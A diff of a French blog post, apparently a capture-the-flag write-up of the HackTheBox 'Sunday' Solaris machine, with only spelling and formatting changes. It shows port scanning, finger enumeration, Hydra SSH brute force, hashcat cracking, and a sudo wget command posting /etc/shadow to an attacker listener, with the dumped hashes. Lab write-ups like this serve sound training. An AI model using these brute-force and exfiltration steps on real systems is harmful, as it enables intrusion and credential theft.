@@ -3,7 +3,7 @@ title: "Solution du CTF Sunday de HackTheBox"
 tags: [CTF, HackTheBox]
 ---
 
-Thank Got It's Monday
+Thank God It's Monday
 ---------------------
 
 Ce qui m'a attiré initialement sur le CTF Sunday de [HackTheBox](https://www.hackthebox.eu/) était le fait qu'il s'agissait de la seule machine sous *Solaris*.  
@@ -32,7 +32,7 @@ Certes, certes...
 
 Essayons de fragmenter les paquets et de les rendre moins typés :  
 
-```
+```console
 devloop@kali:~$ sudo nmap -T5 -f 10.10.10.76 -p-  --data-length 18
 [sudo] Mot de passe de devloop : 
 Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-05 17:52 CEST
@@ -51,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 895.68 seconds
 
 Allez essaye encore :  
 
-```
+```console
 devloop@kali:~$ sudo masscan -e tun0 --rate 200 -p1-65535 10.10.10.76
 
 Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2018-06-14 08:38:20 GMT
@@ -64,7 +64,7 @@ Discovered open port 79/tcp on 10.10.10.76
 Discovered open port 49333/tcp on 10.10.10.76
 ```
 
-Le port 22022 s'avère être un SSH (SunSSH). Quand au finger on peut le questionner un peu moins gentiment avec Metasploit :  
+Le port 22022 s'avère être un SSH (SunSSH). Quant au finger on peut le questionner un peu moins gentiment avec Metasploit :  
 
 ```
 msf auxiliary(scanner/finger/finger_users) > exploit
@@ -95,7 +95,7 @@ msf auxiliary(scanner/finger/finger_users) > exploit
 
 Il y a de l'activité sur le compte *sunny* :  
 
-```
+```console
 devloop@kali:~$ finger -l sunny@10.10.10.76
 Login name: sunny               In real life: sunny
 Directory: /export/home/sunny           Shell: /bin/bash
@@ -119,7 +119,7 @@ Les IPs sont celles d'autres participants. L'emplacement du home de l'utilisateu
 
 Faute de mieux on brute-force le compte et on se trouve un peu bête devant le mot de passe trouvé :  
 
-```
+```console
 devloop@kali:~$ hydra -l sunny -P /usr/share/ncrack/top50000.pwd ssh://10.10.10.76:22022
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -134,9 +134,9 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-14 21:30:12
 Hydra (http://www.thc.org/thc-hydra) finished at 2018-06-14 21:35:16
 ```
 
-On obtient alors notre accès sur la machine mais pas encore de flag.  
+On obtient alors notre accès sur la machine, mais pas encore de flag.  
 
-```
+```console
 sunny@sunday:~$ uname -a
 SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
 
@@ -153,18 +153,18 @@ sunny    pts/8         9:35am                      w
 
 Je trouve quelques fichiers bizarres sur la machine :  
 
-```
+```console
 sunny@sunday:~$ file ./Desktop/core
 ./Desktop/core: ELF 32-bit LSB core file 80386 Version 1, from 'packagemanager'
 sunny@sunday:~$ file ./Downloads/reverse.solaris.x86.1337.elf
 ./Downloads/reverse.solaris.x86.1337.elf:       ELF 32-bit LSB executable 80386 Version 1, statically linked, stripped
 ```
 
-Le second est potentiellement le reverse-shell d'un autre participant. Quand au core dump on laisse de côté pour le moment.  
+Le second est potentiellement le reverse-shell d'un autre participant. Quant au core dump on laisse de côté pour le moment.  
 
 Il y a un programme utilisable via sudo mais qui ne semblait pas exploitable via des failles classiques :  
 
-```
+```console
 sunny@sunday:~$ sudo -l
 User sunny may run the following commands on this host:
     (root) NOPASSWD: /root/troll
@@ -175,14 +175,14 @@ Copyright (C) 2005 Free Software Foundation, Inc.
 
 Encore une bizarrerie :  
 
-```
+```console
 sunny@sunday:/etc$ ls -l /var/adm/spellhist
 -rw-rw-rw- 1 root bin 0 2009-05-14 21:18 /var/adm/spellhist
 ```
 
-Finalement je trouve des hashs dans un dossier backup :  
+Finalement je trouve des hashes dans un dossier backup :  
 
-```
+```console
 sunny@sunday:/backup$ ls -l
 total 2
 -r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
@@ -220,7 +220,7 @@ Si on cherche des mentions de l'utilisateur *sammy* sur le système, on en trouv
 
 Il est temps de faire chauffer le processeur (faute de mieux) :  
 
-```
+```console
 $ ./hashcat64.bin -m 7400 -a 0 /tmp/hashes.txt /opt/wordlists/rockyou.txt
  hashcat (v4.1.0) starting...
 
@@ -258,19 +258,19 @@ $ ./hashcat64.bin -m 7400 -a 0 /tmp/hashes.txt /opt/wordlists/rockyou.txt
 Sunday
 ------
 
-Une fois connecté avec le compte *sammy* on obtient notre flag (*a3d9498027ca5187ba1793943ee8a598*).  
+Une fois connecté avec le compte *sammy* on obtient notre flag (`a3d9498027ca5187ba1793943ee8a598`).  
 
 Et on dispose d'une entrée sudo intéressante :  
 
-```
+```console
 sammy@sunday:~$ sudo -l
 User sammy may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/wget
 ```
 
-La question s'est posée de comment exploiter cette autorisation sans spolier les autres participants et sans modifier de fichiers système (ex: */etc/passwd*) ce qui risquerait là aussi de bloquer les autres participants...  
+La question s'est posée de comment exploiter cette autorisation sans spolier les autres participants et sans modifier de fichiers système (ex: `/etc/passwd`) ce qui risquerait là aussi de bloquer les autres participants...  
 
-J'ai cherché du côté du fichier *wgetrc* mais il ne permet pas de faire exécuter des commandes unix :'(  
+J'ai cherché du côté du fichier `wgetrc` mais il ne permet pas de faire exécuter des commandes unix :'(  
 
 Finalement l'idée que j'ai retenu est d'utiliser wget pour soumettre en HTTP POST un fichier vers un port qu'on aura auparavant mis en écoute.  
 
@@ -282,7 +282,7 @@ sudo /usr/bin/wget --post-file /etc/shadow http://10.10.15.90:8080/
 
 Et c'est dans la poche :  
 
-```
+```console
 devloop@kali:/tmp$ ncat -l -p 8080 -v
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::8080
@@ -323,6 +323,6 @@ sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
 sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 ```
 
-De la même façon on peut exfiltrer le flag root (*fb40fab61d99d37536daeec0d97af9b8*)
+De la même façon, on peut exfiltrer le flag root (`fb40fab61d99d37536daeec0d97af9b8`)
 
 *Published September 29 2018 at 20:09*
